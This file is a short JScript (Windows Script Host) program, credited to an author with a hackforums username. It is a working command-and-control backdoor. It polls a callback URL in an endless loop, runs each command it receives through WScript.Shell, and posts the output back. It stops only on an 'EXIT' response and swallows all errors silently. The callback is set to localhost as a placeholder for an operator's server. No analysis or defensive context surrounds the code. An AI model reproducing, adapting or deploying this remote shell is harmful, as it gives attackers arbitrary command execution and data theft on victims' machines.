// coded by darksel0  ....2024
//https://github.com/Darksel0
//hackforums.net username:darkosel
var callbackUrl = "http://127.0.0.1:80/";

function main() {
    var breakLoop = false;

    while (!breakLoop) {
        try {
            // Create an XMLHTTP request to send a GET request to the callback URL
            var httpRequest = new ActiveXObject("MSXML2.ServerXMLHTTP.6.0");
            httpRequest.open("GET", callbackUrl, false);
            httpRequest.send();

            var command = httpRequest.responseText.trim();

            if (command.indexOf("EXIT") !== -1) {
                breakLoop = true;
            } else {
                // Execute the command
                var shell = new ActiveXObject("WScript.Shell");
                var exec = shell.Exec(command);
                var result = "";

                // Read the output of the command
                while (exec.Status === 0) {
                    WScript.Sleep(100); // Wait for the command to finish
                }
                result = exec.StdOut.ReadAll();

                // Send the result back to the callback URL
                var postRequest = new ActiveXObject("MSXML2.ServerXMLHTTP.6.0");
                postRequest.open("POST", callbackUrl, false);
                postRequest.setRequestHeader("Content-Type", "text/plain");
                postRequest.send(result);
            }
        } catch (e) {
            // Handle any exceptions silently
            // Optional: You could log the error to a file or ignore completely
        }
    }
}

main();
